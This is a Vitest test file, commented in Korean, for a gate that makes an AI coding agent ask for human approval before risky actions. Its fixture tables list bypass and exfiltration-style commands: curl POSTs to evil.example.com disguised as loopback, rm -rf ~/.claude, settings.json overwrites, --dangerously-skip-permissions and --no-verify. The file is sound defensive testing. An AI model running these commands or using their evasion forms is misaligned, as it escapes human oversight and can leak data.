/**
 * `lib/security/human-gate-enforce.js` 표 테스트 — 강제 판정 코어(CA-04 L1).
 *
 * 여기서 보는 것: HG-07·HG-12·HG-13 의 양성/음성 표, 보호 범위 술어
 * `isClaudeConfigPath`(Windows 경로 3형 포함), enforce 기본 off 핀, askHonoredModes
 * allowlist, 설정 검증(`validateEnforceConfig`), 결과 어휘, 순수성 소스 스캔(+스캐너
 * 자기검증), 새 정규식의 긴 단일 런 스윕.
 *
 * 이 파일이 못 보는 것: 훅 배선(L2 — 호출자 0), 실제 명령 분포에서의 오탐·미탐률
 * (코퍼스 없음), 호스트가 `ask` 를 실제로 존중하는 권한 모드 집합(L0 프로브 몫),
 * 모듈 헤더 "이 설계가 못 보는 것" 1~7 의 우회 형(간접 쓰기 등 — 설계상 비범위).
 */

import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import {
  decideHumanGate,
  ENFORCE_CONFIG_PATH,
  ENFORCE_DECISIONS,
  ENFORCE_DEFAULTS,
  ENFORCE_PATTERNS,
  ENFORCE_REASONS,
  ENFORCEABLE_GATE_IDS,
  evaluateMatrix,
  HG07_CURL_PATTERN_INDEX,
  isClaudeConfigPath,
  MATRIX_PATTERN_SUBSTITUTES,
  readEnforceConfig,
  resolveEnforceConfig,
  validateEnforceConfig,
} from '../../lib/security/human-gate-enforce.js';
import { classify, getGateRow, HUMAN_GATE_MATRIX } from '../../lib/security/human-gates.js';
import { curlProvenLoopbackOnly, shellWords } from '../../lib/security/human-gate-curl.js';

// ── 픽스처 경로 ────────────────────────────────────────────────────────────
// Windows 경로는 조각으로 조립한다(land 인용 게이트가 드라이브+사용자 폴더 리터럴을 거부).
const win = (...segs) => segs.join('\\');
const HOME = ['C:', 'Users', 'HeechangLee'];
const HOME_83 = ['C:', 'Users', 'HEECHA~1'];
const REPO = [...HOME, 'Desktop', 'AI', 'Artibot'];
const CACHE_ROOT = win(...HOME, '.claude', 'plugins', 'cache', 'artibot', 'artibot', '4.67.0');
const SOURCE_ROOT = win(...REPO, 'plugins', 'artibot');
const WORKTREE_SOURCE_ROOT = win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot');

/** @param {object} enforce */
const configWith = (enforce) => ({ permissions: { autoApprove: [], humanGates: { enforce } } });

const ENFORCE_ALL = configWith({
  enabled: true,
  mode: 'enforce',
  gates: ['HG-07', 'HG-12', 'HG-13'],
  askHonoredModes: ['default', 'acceptEdits'],
});

/** 기본값: 강제 켠 합성 config · 권한 모드 default · pluginRoot = 설치 캐시. */
const decide = (input) => decideHumanGate({
  permissionMode: 'default',
  pluginRoot: CACHE_ROOT,
  config: ENFORCE_ALL,
  ...input,
});

const hitIds = (result) => result.hits.map((h) => h.id);

// ── 판정 표 ────────────────────────────────────────────────────────────────
// 양성: 강제 켠 config 에서 'ask'. 음성: 매트릭스에는 걸리지만(또는 아예 안 걸려) 강제 안 함.

const HG12_POSITIVE = [
  ['8.3 단축형 홈의 사용자 settings.json (Write)', { tool: 'Write', path: win(...HOME_83, '.claude', 'settings.json') }],
  ['posix 홈 settings.local.json (Edit)', { tool: 'Edit', path: '/home/dev/.claude/settings.local.json' }],
  ['split worktree 자신의 .claude/settings.local.json', { tool: 'Write', path: win(...REPO, '.claude', 'worktrees', 'x', '.claude', 'settings.local.json') }],
  ['설치 캐시 hooks.json (.claude 세그먼트)', { tool: 'Edit', path: win(CACHE_ROOT, 'hooks', 'hooks.json') }],
  ['개발 설치 pluginRoot 아래 dispatch-table.json', { tool: 'Write', path: win(SOURCE_ROOT, 'hooks', 'dispatch-table.json'), pluginRoot: SOURCE_ROOT }],
  ['pluginRoot 가 그 worktree 소스 자신이면 소스 hooks.json 도 보호', { tool: 'Write', path: win(WORKTREE_SOURCE_ROOT, 'hooks', 'hooks.json'), pluginRoot: WORKTREE_SOURCE_ROOT }],
  ['Bash 리다이렉트 뒤 체인 — $ 앵커 classify 가 놓치는 형', { tool: 'Bash', command: 'echo {} > ~/.claude/settings.json && echo done' }],
  ['Bash --dangerously-skip-permissions', { tool: 'Bash', command: 'claude --dangerously-skip-permissions -p "hi"' }],
  ['Bash 백슬래시 경로로 cp', { tool: 'Bash', command: `cp x.json ${win(...HOME, '.claude', 'dispatch-table.json')}` }],
  // review2 수리 라운드 1 (2026-09-28) — 재현 후 핀
  ['B4 glob basename', { tool: 'Bash', command: 'cp p ~/.claude/settings.js?n' }],
  ['B4 brace basename', { tool: 'Bash', command: 'tee ~/.claude/settings.jso{n,}' }],
  ['B5 cd .claude (끝 슬래시 없음) 뒤 맨 이름', { tool: 'Bash', command: 'cd ~/.claude && cp p settings.json' }],
  ['B5 worktree 접두 뒤 .. 로 .claude 복귀', { tool: 'Bash', command: 'cd ~/.claude/worktrees/x/../.. && cp p settings.json' }],
  ['B6 cp -r 로 .claude 디렉터리에 쓰기', { tool: 'Bash', command: 'cp -r p/. ~/.claude/' }],
  ['B6 tar -C .claude', { tool: 'Bash', command: 'tar -xf p.tar -C ~/.claude' }],
  ['B6 mv .claude', { tool: 'Bash', command: 'mv ~/.claude x' }],
  ['B6 rm -rf .claude', { tool: 'Bash', command: 'rm -rf ~/.claude' }],
  ['B6 worktree 자신의 .claude 디렉터리', { tool: 'Bash', command: 'rm -rf .claude/worktrees/x/.claude' }],
];

const HG12_NEGATIVE = [
  ['.vscode/settings.json (Write)', { tool: 'Write', path: '.vscode/settings.json' }],
  ['리포 소스 plugins/artibot/hooks/hooks.json (Edit)', { tool: 'Edit', path: 'plugins/artibot/hooks/hooks.json' }],
  ['split worktree 안 소스 경로 (pluginRoot = 설치 캐시)', { tool: 'Write', path: win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot', 'hooks', 'hooks.json') }],
  ['Bash 읽기 전용 cat', { tool: 'Bash', command: 'cat ~/.claude/settings.json' }],
  ['Bash git diff', { tool: 'Bash', command: 'git diff -- .claude/settings.local.json' }],
  ['Bash grep 로 플래그 검색', { tool: 'Bash', command: 'grep -rn -- --dangerously-skip-permissions docs/' }],
  ['Bash .vscode 로 리다이렉트', { tool: 'Bash', command: 'echo {} > .vscode/settings.json' }],
];

/** B6 디렉터리 규칙의 거짓 양성 가드 — 읽기·이동 동사이거나 .claude 자체가 대상이 아니다. */
const DIR_RULE_NEGATIVE = [
  ['ls .claude', 'ls ~/.claude'],
  ['cd .claude 뒤 ls', 'cd ~/.claude && ls'],
  ['du .claude', 'du -sh ~/.claude'],
  ['worktree 정리 rm -rf .claude/worktrees/x', 'rm -rf .claude/worktrees/x'],
  ['.claude 하위 디렉터리 ls', 'ls ~/.claude/agents'],
];

const HG13_POSITIVE = [
  ['설치 캐시 artibot.config.json (Write)', { tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json') }],
  ['개발 설치 pluginRoot 아래 artibot.config.json (Edit)', { tool: 'Edit', path: win(SOURCE_ROOT, 'artibot.config.json'), pluginRoot: SOURCE_ROOT }],
  ['git commit --no-verify', { tool: 'Bash', command: 'git commit --no-verify -m "wip"' }],
  ['git -C 경로 push --no-verify', { tool: 'Bash', command: 'git -C ../repo push --no-verify origin feat' }],
  ['bypassPrePushHooks true 설정', { tool: 'Bash', command: 'git config artibot.bypassPrePushHooks true' }],
  ['Bash 로 설치 캐시 설정 덮어쓰기 뒤 체인', { tool: 'Bash', command: `node gen.js > ${win(CACHE_ROOT, 'artibot.config.json')}; echo ok` }],
];

const HG13_NEGATIVE = [
  ['리포 소스 artibot.config.json (pluginRoot = 설치 캐시)', { tool: 'Write', path: 'plugins/artibot/artibot.config.json' }],
  ['split worktree 안 소스 artibot.config.json', { tool: 'Edit', path: win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot', 'artibot.config.json') }],
  ['grep 로 --no-verify 검색', { tool: 'Bash', command: 'grep -rn -- --no-verify lib/' }],
  ['git log --grep', { tool: 'Bash', command: 'git log --oneline --grep=--no-verify' }],
  ['echo 인용', { tool: 'Bash', command: 'echo "bypassPrePushHooks: true"' }],
];

const HG07_POSITIVE = [
  ['외부 호스트 POST', 'curl -X POST https://api.example.com/v1/items'],
  ['loopback + 외부 혼재', 'curl -X POST http://127.0.0.1:8080/a https://evil.example.com/b'],
  ['userinfo 로 loopback 위장', 'curl -X POST http://127.0.0.1@evil.example.com/'],
  ['스킴 없는 외부 호스트', 'curl -X POST example.com/hook'],
  ['URL 없음 — loopback 을 증명 못 함', 'curl -X POST "$HOOK_URL"'],
  ['loopback 이어도 --proxy 가 외부', 'curl -X POST --proxy proxy.example.com:3128 http://127.0.0.1/x'],
  ['gh pr merge', 'gh pr merge 12 --squash'],
  ['git push main', 'git push origin main'],
  // review2 수리 라운드 1 — loopback 은 "전 토큰 증명"일 때만 비보호
  ['B1 --connect-to 로 외부 재지정', 'curl -X POST --connect-to 127.0.0.1:80:evil.example.com:80 http://127.0.0.1/'],
  ['B2 192자 넘는 userinfo 뒤 외부 호스트', `curl -X POST http://127.0.0.1:${'a'.repeat(200)}@evil.example.com/`],
  ['B3 역슬래시 @', 'curl -X POST http://127.0.0.1\\@evil.example.com/'],
  ['B3 따옴표 잔여 @', 'curl -X POST "http://127.0.0.1"@evil.example.com/'],
  ['B3 둘째 인자 x@evil', 'curl -X POST http://127.0.0.1/ x@evil.example.com'],
  ['B3 점 없는 호스트', 'curl -X POST http://127.0.0.1/ intranet'],
  ['미지 옵션(-K 설정 파일)', 'curl -X POST -K cfg.txt http://127.0.0.1/'],
  // 부모 리더 보정 (1): 인식 못 한 토큰 1개 = 증명 실패 = 보호 (음성 대조의 짝)
  ['인식 못 한 비옵션 단어 1개 섞인 loopback', 'curl -X POST http://127.0.0.1/ foo'],
  ['인식 못 한 무해 옵션(--max-time 5)도 증명 실패', 'curl -X POST --max-time 5 http://127.0.0.1/'],
  ['따옴표 없는 개행 뒤 둘째 명령', 'curl -X POST http://127.0.0.1/\nrm -rf x'],
  ['체인 — 둘째 세그먼트', 'curl -X POST http://127.0.0.1/ && curl -d x https://evil.example.com'],
];

const HG07_NEGATIVE = [
  ['loopback curl -X POST http://127.0.0.1', 'curl -X POST http://127.0.0.1'],
  ['localhost + 헤더·본문', `curl -X POST http://localhost:3000/api -H 'Content-Type: application/json' -d '{"a":1}'`],
  ['IPv6 ::1', `curl -X POST 'http://[::1]:8080/x'`],
  ['127/8 대역 + -o 출력 파일', 'curl -X POST http://127.1.2.3/x -o out.json'],
  ['grep 인용 gh pr merge', 'grep -rn "gh pr merge" docs'],
  ['무인자 플래그 묶음 -sS·-k', 'curl -sS -k -X POST http://127.0.0.1:8080/hook'],
  ['값 붙은 짧은 옵션 -XPOST', 'curl -XPOST http://localhost/x'],
  ['--data= 값 형', "curl -X POST --data='{}' https://127.0.0.1/x"],
];

describe('decideHumanGate — HG-12 권한 상승 표', () => {
  it.each(HG12_POSITIVE)('양성: %s → ask', (_label, input) => {
    const result = decide(input);
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-12');
  });

  it.each(HG12_NEGATIVE)('음성: %s → 강제 안 함 (HG-12 적중은 기록)', (_label, input) => {
    const result = decide(input);
    expect(hitIds(result)).toContain('HG-12');
    expect(result.decision).toBe('record');
  });

  it.each(DIR_RULE_NEGATIVE)('B6 디렉터리 규칙 음성: %s → 강제 안 함', (_label, command) => {
    expect(['pass', 'record']).toContain(decide({ tool: 'Bash', command }).decision);
  });

  it('못 보는 것 핀: cd 와 맨 이름 사이가 192자 창을 넘으면 놓친다', () => {
    const command = `cd ~/.claude && echo ${'x'.repeat(200)} && cp p settings.json`;
    expect(['pass', 'record']).toContain(decide({ tool: 'Bash', command }).decision);
  });
});

describe('decideHumanGate — HG-13 보안 정책 비활성화 표', () => {
  it.each(HG13_POSITIVE)('양성: %s → ask', (_label, input) => {
    const result = decide(input);
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-13');
  });

  it.each(HG13_NEGATIVE)('음성: %s → 강제 안 함 (HG-13 적중은 기록)', (_label, input) => {
    const result = decide(input);
    expect(hitIds(result)).toContain('HG-13');
    expect(result.decision).toBe('record');
  });
});

describe('decideHumanGate — HG-07 외부 시스템 쓰기 표', () => {
  it.each(HG07_POSITIVE)('양성: %s → ask', (_label, command) => {
    const result = decide({ tool: 'Bash', command });
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-07');
  });

  it.each(HG07_NEGATIVE)('음성: %s → 강제 안 함 (HG-07 적중은 기록)', (_label, command) => {
    const result = decide({ tool: 'Bash', command });
    expect(hitIds(result)).toContain('HG-07');
    expect(result.decision).toBe('record');
  });

  it('HG-07 은 출하 gates 초기값(HG-12·HG-13)에 없으면 기록만 한다 (오너 결정 O2 대기)', () => {
    const config = configWith({ enabled: true, mode: 'enforce', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] });
    const result = decide({ tool: 'Bash', command: 'gh pr merge 1', config });
    expect(result.decision).toBe('record');
    expect(result.reason).toBe('gate-not-configured');
  });

  it('curl 패턴 인덱스 결합 핀 — HG-07 patterns[HG07_CURL_PATTERN_INDEX] 가 curl 행이다', () => {
    expect(getGateRow('HG-07').patterns[HG07_CURL_PATTERN_INDEX].source.startsWith('\\bcurl\\b')).toBe(true);
  });
});

describe('human-gate-curl — loopback 증명 (allowlist, fail-closed)', () => {
  it.each([
    ['기본', 'curl -X POST http://127.0.0.1'],
    ['https + 포트 + 경로', 'curl -X POST https://localhost:8443/a/b'],
    ['[::1] 따옴표', "curl -X POST 'http://[::1]:8080/x'"],
    ['맨 호스트:포트', 'curl -X POST 127.0.0.1:3000/hook'],
    ['값 옵션 값 건너뛰기(따옴표 속 @·공백)', `curl -X POST -H 'Authorization: Bearer a@b' -d "x y" http://127.0.0.1/`],
    ['플래그 묶음 + 긴 플래그', 'curl -sSk --fail --show-headers -X POST http://127.0.0.1/'],
  ])('증명됨: %s', (_label, command) => {
    expect(curlProvenLoopbackOnly(command)).toBe(true);
  });

  it.each([
    ['대상 없음', 'curl -X POST'],
    ['curl 아님', 'wget http://127.0.0.1'],
    ['앞에 환경변수', 'FOO=1 curl -X POST http://127.0.0.1'],
    ['인식 못 한 비옵션 단어', 'curl http://127.0.0.1 foo'],
    ['미지 옵션', 'curl --connect-to a:1:b:2 http://127.0.0.1'],
    ['userinfo', 'curl http://u@127.0.0.1'],
    ['스킴 ftp', 'curl ftp://127.0.0.1'],
    ['포트 비숫자', 'curl http://127.0.0.1:8o/'],
    ['옥텟 256', 'curl http://127.0.0.256/'],
    ['0.0.0.0', 'curl http://0.0.0.0/'],
    ['localhost.', 'curl http://localhost./'],
    ['큰따옴표 속 $', 'curl "http://127.0.0.1/$X"'],
    ['짝 없는 따옴표', "curl 'http://127.0.0.1"],
    ['따옴표 밖 &', 'curl http://127.0.0.1/?a=1&b=2'],
    ['비문자열', 42],
    ['-L 리다이렉트 추종 (307/308 이 POST 를 외부로 재전송 가능)', 'curl -L -X POST http://127.0.0.1/'],
    ['--location 긴 형', 'curl --location -X POST http://127.0.0.1/'],
    ['--include (curl 8.19 도움말에 없음)', 'curl --include -X POST http://127.0.0.1/'],
  ])('증명 실패: %s', (_label, command) => {
    expect(curlProvenLoopbackOnly(command)).toBe(false);
  });

  it('shellWords — 따옴표 결합·작은따옴표 속 특수문자는 글자, 증명 불가 글자는 null', () => {
    expect(shellWords(`a"b c"'d$e' f`)).toEqual(['ab cd$e', 'f']);
    expect(shellWords("''")).toEqual(['']);
    expect(shellWords('a\\b')).toBeNull();
    expect(shellWords('a;b')).toBeNull();
    expect(shellWords('a\nb')).toBeNull();
    expect(shellWords('a*')).toBeNull();
  });
});

describe('Bash 면제 allowlist — 면제를 좁히는 조건', () => {
  it.each([
    ['git diff --output= 는 파일을 쓴다', 'git diff --output=.claude/settings.json'],
    ['rg --pre 는 명령을 실행한다', 'rg --pre=./x.sh foo ~/.claude/settings.json'],
    ['git -c 는 설정 주입(pager 등 실행)', 'git -c core.pager=./x.sh log -- ~/.claude/settings.json'],
    ['tee 단어', 'cat tee ~/.claude/settings.json'],
    ['-i (브리프 지정 — grep -i 는 과보호 거짓 양성)', 'grep -i x ~/.claude/settings.json'],
    ['명령 치환', 'cat $(echo ~/.claude/settings.json)'],
    ['체인 두 번째 세그먼트', 'cat ~/.claude/settings.json && true'],
    ['allowlist 밖 선두 동사', 'less ~/.claude/settings.json'],
    // N1 (review2): 경로가 붙은 동사는 allowlist 의 그 프로그램이라는 보장이 없다.
    ['N1 상대 경로 동사 ./cat', './cat ~/.claude/settings.json'],
    ['N1 절대 경로 동사 /tmp/x/grep', '/tmp/x/grep foo ~/.claude/settings.json'],
    ['N1 절대 경로 동사 /usr/bin/cat', '/usr/bin/cat ~/.claude/settings.json'],
  ])('%s → 면제 안 됨(ask)', (_label, command) => {
    const result = decide({ tool: 'Bash', command });
    expect(result.decision).toBe('ask');
    expect(result.gate).toBe('HG-12');
  });

  it.each([
    ['git -C <path> show', 'git -C ../repo show HEAD:.claude/settings.json'],
    ['git --no-pager log', 'git --no-pager log -- .claude/settings.json'],
  ])('%s → 면제(record)', (_label, command) => {
    expect(decide({ tool: 'Bash', command }).decision).toBe('record');
  });
});

describe('decideHumanGate — 판정 대상 밖 행과 무적중', () => {
  it('HG-07/12/13 밖 행 적중은 기록만 한다 (row-not-enforceable)', () => {
    const result = decide({ tool: 'Bash', command: 'terraform apply' });
    expect(hitIds(result)).toEqual(['HG-08']);
    expect(result.decision).toBe('record');
    expect(result.reason).toBe('row-not-enforceable');
  });

  it('매트릭스 무적중은 pass', () => {
    const result = decide({ tool: 'Bash', command: 'npm --version' });
    expect(result).toMatchObject({ decision: 'pass', wouldDecide: 'pass', gate: null, reason: 'no-hit' });
  });

  it.each([
    ['인자 없음', undefined],
    ['null', null],
    ['tool 없음', { command: 'git commit --no-verify' }],
    ['tool 비문자열', { tool: 42, command: 'git commit --no-verify' }],
  ])('잘못된 입력(%s)은 pass/invalid-input', (_label, input) => {
    expect(decideHumanGate(input)).toMatchObject({ decision: 'pass', reason: 'invalid-input' });
  });

  it('HG-12/13 도구 allowlist 밖 도구는 강제하지 않는다', () => {
    const result = decide({ tool: 'NotebookEdit', path: win(...HOME, '.claude', 'settings.json') });
    expect(['pass', 'record']).toContain(result.decision);
  });
});

describe('isClaudeConfigPath — 보호 범위 술어', () => {
  const opts = { pluginRoot: CACHE_ROOT };

  it.each([
    ['백슬래시 Windows 경로', win(...HOME, '.claude', 'settings.json'), opts],
    ['드라이브·경로 대소문자 혼합', win('c:', 'USERS', 'heechanglee', '.CLAUDE', 'Settings.Local.JSON'), opts],
    ['소문자 드라이브 경로 vs 대문자 드라이브 pluginRoot', win('c:', 'users', 'heechanglee', 'desktop', 'ai', 'artibot', 'plugins', 'artibot', 'hooks', 'hooks.json'), { pluginRoot: SOURCE_ROOT }],
    ['8.3 단축형 홈의 .claude', win(...HOME_83, '.claude', 'settings.local.json'), opts],
    ['구분자 혼합·연속 슬래시', `${win(...HOME)}\\\\.claude//settings.json`, opts],
    ['msys 드라이브 형(/c/…) vs Windows pluginRoot', `/c/${['Users', 'HeechangLee', 'Desktop', 'AI', 'Artibot', 'plugins', 'artibot', 'hooks', 'hooks.json'].join('/')}`, { pluginRoot: SOURCE_ROOT }],
    ['.. 로 worktree 접두를 벗어난 경로', '.claude/worktrees/x/../../settings.json', opts],
    ['worktree 자신의 .claude/settings.local.json', '.claude/worktrees/x/.claude/settings.local.json', opts],
    ['설치 캐시 artibot.config.json', win(CACHE_ROOT, 'artibot.config.json'), opts],
  ])('보호: %s', (_label, p, options) => {
    expect(isClaudeConfigPath(p, options)).toBe(true);
  });

  it.each([
    ['.vscode/settings.json', '.vscode/settings.json', opts],
    ['리포 소스 hooks.json', 'plugins/artibot/hooks/hooks.json', opts],
    ['split worktree 안 소스 경로', win(...REPO, '.claude', 'worktrees', 'x', 'plugins', 'artibot', 'hooks', 'hooks.json'), opts],
    ['worktree 루트의 settings.json (.claude 아님)', '.claude/worktrees/x/settings.json', opts],
    ['보호 basename 아님', win(...HOME, '.claude', 'commands', 'foo.md'), opts],
    ['basename 접미 변형', '.claude/settings.json.bak', opts],
    ['상대 pluginRoot 는 무시한다', 'plugins/artibot/hooks/hooks.json', { pluginRoot: 'plugins/artibot' }],
    ['pluginRoot 미주입', win(...REPO, 'plugins', 'artibot', 'hooks', 'hooks.json'), {}],
    ['빈 문자열', '', opts],
    ['비문자열', 42, opts],
  ])('비보호: %s', (_label, p, options) => {
    expect(isClaudeConfigPath(p, options)).toBe(false);
  });

  it('못 보는 것 핀: 8.3 단축형 경로 vs 긴 이름 pluginRoot 는 같은 폴더여도 비보호로 본다', () => {
    // 순수 함수라 8.3 이름을 풀 수 없다(파일시스템 조회 필요). .claude 세그먼트가 없으면 놓친다.
    const p = win(...HOME_83, 'Desktop', 'AI', 'Artibot', 'plugins', 'artibot', 'hooks', 'hooks.json');
    expect(isClaudeConfigPath(p, { pluginRoot: SOURCE_ROOT })).toBe(false);
  });
});

describe('enforce 기본 off 핀 — 출하 artibot.config.json', () => {
  const shipped = JSON.parse(readFileSync(new URL('../../artibot.config.json', import.meta.url), 'utf8'));
  const allPositive = [
    ...HG12_POSITIVE.map(([, input]) => input),
    ...HG13_POSITIVE.map(([, input]) => input),
    ...HG07_POSITIVE.map(([, command]) => ({ tool: 'Bash', command })),
  ];

  it('출하 config 의 enforce 는 부재이거나 enabled !== true 이고, 검증을 통과한다', () => {
    const enforce = readEnforceConfig(shipped);
    expect(enforce === undefined || enforce.enabled !== true).toBe(true);
    expect(validateEnforceConfig(enforce)).toEqual([]);
  });

  it('출하 config 로는 양성 표 전부가 강제 결정(ask/deny)을 내지 않는다', () => {
    for (const input of allPositive) {
      for (const permissionMode of ['default', 'bypassPermissions', undefined]) {
        const result = decideHumanGate({ ...input, permissionMode, pluginRoot: CACHE_ROOT, config: shipped });
        expect(['pass', 'record']).toContain(result.decision);
      }
    }
  });

  it('키 부재 config 는 강제하지 않는다 (부재 = ENFORCE_DEFAULTS = 꺼짐)', () => {
    for (const config of [undefined, {}, { permissions: { autoApprove: [] } }, { permissions: { humanGates: {} } }]) {
      const result = decide({ tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json'), config });
      expect(result.decision).toBe('record');
      expect(result.reason).toBe('enforce-disabled');
      expect(result.configErrors).toEqual([]);
    }
  });

  it('enabled:false 합성 config 는 강제하지 않되, 강제 시 결정을 wouldDecide 로 남긴다', () => {
    const config = configWith({ enabled: false, mode: 'enforce', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] });
    const result = decide({ tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json'), config });
    expect(result).toMatchObject({ decision: 'record', wouldDecide: 'ask', reason: 'enforce-disabled', gate: 'HG-13' });
    expect(result.configErrors).toEqual([]);
  });

  it("mode:'shadow' 는 기록하고 wouldDecide 에 강제 시 결정을 남긴다", () => {
    const config = configWith({ enabled: true, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: ['default'] });
    const asked = decide({ tool: 'Bash', command: 'git commit --no-verify', config });
    expect(asked).toMatchObject({ decision: 'record', wouldDecide: 'ask', reason: 'shadow-mode' });
    const denied = decide({ tool: 'Bash', command: 'git commit --no-verify', config, permissionMode: 'bypassPermissions' });
    expect(denied).toMatchObject({ decision: 'record', wouldDecide: 'deny', reason: 'shadow-mode' });
  });
});

describe('스위치 3경우 핀 — 키 부재 / enabled:false / enabled:true (양성 대조)', () => {
  const inputs = [
    { tool: 'Write', path: win(CACHE_ROOT, 'artibot.config.json') },
    { tool: 'Bash', command: 'git commit --no-verify -m x' },
    { tool: 'Edit', path: win(...HOME, '.claude', 'settings.json') },
  ];
  const cases = [
    ['키 부재', {}, ['record']],
    ['enabled:false', configWith({ enabled: false }), ['record']],
    ['enabled:true + mode enforce (나머지 키는 기본값)', configWith({ enabled: true, mode: 'enforce' }), ['deny']],
  ];

  it.each(cases)('%s', (_label, config, allowed) => {
    for (const input of inputs) {
      for (const permissionMode of ['default', 'bypassPermissions']) {
        const result = decideHumanGate({ ...input, permissionMode, pluginRoot: CACHE_ROOT, config });
        expect(allowed).toContain(result.decision);
        expect(result.wouldDecide).toBe('deny');
      }
    }
  });

  it('기본 askHonoredModes 는 [] 이라 enabled:true 만으로는 ask 가 안 나온다 — ask 는 합성 config 로만', () => {
    const config = configWith({ enabled: true, mode: 'enforce', askHonoredModes: ['default'] });
    expect(decideHumanGate({ ...inputs[1], permissionMode: 'default', config }).decision).toBe('ask');
  });
});

describe('ENFORCE_DEFAULTS · resolveEnforceConfig — 부재·부분 설정 해석', () => {
  it('기본값은 꺼짐·shadow·gates 정확 집합 HG-12/HG-13·askHonoredModes [] 이고 검증을 통과한다', () => {
    expect(ENFORCE_DEFAULTS).toEqual({ enabled: false, mode: 'shadow', gates: ['HG-12', 'HG-13'], askHonoredModes: [] });
    expect(Object.isFrozen(ENFORCE_DEFAULTS)).toBe(true);
    expect(Object.isFrozen(ENFORCE_DEFAULTS.gates)).toBe(true);
    expect(Object.isFrozen(ENFORCE_DEFAULTS.askHonoredModes)).toBe(true);
    const matrixIds = HUMAN_GATE_MATRIX.map((row) => row.id);
    for (const id of ENFORCE_DEFAULTS.gates) expect(matrixIds).toContain(id);
    expect(ENFORCE_DEFAULTS.gates).not.toContain('HG-07');
    expect(validateEnforceConfig(ENFORCE_DEFAULTS)).toEqual([]);
  });

  it('ENFORCE_DEFAULTS 블록을 그대로 config 에 넣은 합성은 강제 결정(ask/deny)을 내지 않는다', () => {
    const config = configWith({ ...ENFORCE_DEFAULTS });
    const inputs = [
      ...[...HG12_POSITIVE, ...HG13_POSITIVE].map(([, input]) => input),
      ...HG07_POSITIVE.map(([, command]) => ({ tool: 'Bash', command })),
    ];
    for (const input of inputs) {
      for (const permissionMode of ['default', 'bypassPermissions', undefined]) {
        const result = decideHumanGate({ ...input, permissionMode, pluginRoot: CACHE_ROOT, config });
        expect(['pass', 'record']).toContain(result.decision);
        expect(result.configErrors).toEqual([]);
      }
    }
  });

  it('키 부재 → 기본값 그대로, present:false, errors []', () => {
    expect(resolveEnforceConfig({})).toEqual({ present: false, errors: [], ...ENFORCE_DEFAULTS });
    expect(Object.isFrozen(resolveEnforceConfig({}))).toBe(true);
  });

  it('부분 설정 → 있는 키만 덮고 나머지는 기본값', () => {
    expect(resolveEnforceConfig(configWith({ enabled: true, gates: ['HG-07'] }))).toEqual({
      present: true, errors: [], enabled: true, mode: 'shadow', gates: ['HG-07'], askHonoredModes: [],
    });
  });

  it('이상값 → errors 노출, 값은 가장 약한 쪽(enabled 는 === true 만 켜짐, 판정 대상 밖 gate 는 제외)', () => {
    const resolved = resolveEnforceConfig(configWith({ enabled: 'true', gates: ['HG-99', 'HG-13'], askHonoredModes: 'default' }));
    expect(resolved.enabled).toBe(false);
    expect(resolved.gates).toEqual(['HG-13']);
    expect(resolved.askHonoredModes).toEqual([]);
    expect(resolved.errors.length).toBeGreaterThanOrEqual(3);
  });
});

describe('evaluateMatrix — classify 와의 동치 (HG-13[2] 대체 매처 포함)', () => {
  const corpus = [
    ...[...HG12_POSITIVE, ...HG12_NEGATIVE, ...HG13_POSITIVE, ...HG13_NEGATIVE].map(([, input]) => input),
    ...[...HG07_POSITIVE, ...HG07_NEGATIVE].map(([, command]) => ({ tool: 'Bash', command })),
    { tool: 'Bash', command: 'terraform apply' },
    { tool: 'Bash', command: 'cat .env' },
    { tool: 'Bash', command: "UPDATE t SET a=1" },
    { tool: 'Write', path: 'lib/foo.js' },
    { tool: 'Bash', command: '{"bypassPrePushHooks": true}' },
    { tool: 'Bash', command: 'bypassPreCommitHooks=true' },
    { tool: 'Bash', command: "bypassPrePushHooks: 'true'" },
    { tool: 'Bash', command: 'bypassPrePushHooks = true' },
    { tool: 'Bash', command: 'bypassPrePushHooks: false' },
    { tool: 'Bash', command: 'bypassPrePushHooks: trueish' },
    { tool: 'UnknownTool', command: 'terraform apply' },
  ];

  it.each(corpus.map((input) => [JSON.stringify(input).slice(0, 80), input]))('%s', (_label, input) => {
    expect(evaluateMatrix(input)).toEqual(classify(input).hits.map((hit) => hit.id));
  });

  it('대체 등록은 HG-13[2] 하나뿐이고 그 원본이 bypassPre 행이다', () => {
    expect(Object.keys(MATRIX_PATTERN_SUBSTITUTES)).toEqual(['HG-13[2]']);
    expect(getGateRow('HG-13').patterns[2].source).toContain('bypassPre');
    const ids = ENFORCE_PATTERNS.map((entry) => entry.id);
    for (const substitute of Object.values(MATRIX_PATTERN_SUBSTITUTES)) expect(ids).toContain(substitute);
  });

  it('못 보는 것 핀: 구분자가 16자를 넘으면 대체 매처는 놓친다 (원본은 잡는다)', () => {
    const input = { tool: 'Bash', command: `bypassPrePushHooks${' '.repeat(17)}true` };
    expect(classify(input).hits.map((hit) => hit.id)).toContain('HG-13');
    expect(evaluateMatrix(input)).not.toContain('HG-13');
  });
});

describe('askHonoredModes — allowlist (목록 밖·부재·비문자열 → deny)', () => {
  const input = { tool: 'Bash', command: 'git commit --no-verify -m x' };

  it.each([
    ['default', 'ask'],
    ['acceptEdits', 'ask'],
    ['bypassPermissions', 'deny'],
    ['plan', 'deny'],
    ['DEFAULT', 'deny'],
    ['', 'deny'],
    [undefined, 'deny'],
    [null, 'deny'],
    [42, 'deny'],
    [['default'], 'deny'],
  ])('permissionMode=%j → %s', (permissionMode, expected) => {
    const result = decide({ ...input, permissionMode });
    expect(result.decision).toBe(expected);
    expect(result.reason).toBe(expected === 'ask' ? 'mode-ask-honored' : 'mode-not-ask-honored');
  });

  it('askHonoredModes 가 빈 배열이면 모든 모드가 deny', () => {
    const config = configWith({ enabled: true, mode: 'enforce', gates: ['HG-13'], askHonoredModes: [] });
    expect(decide({ ...input, config }).decision).toBe('deny');
  });
});

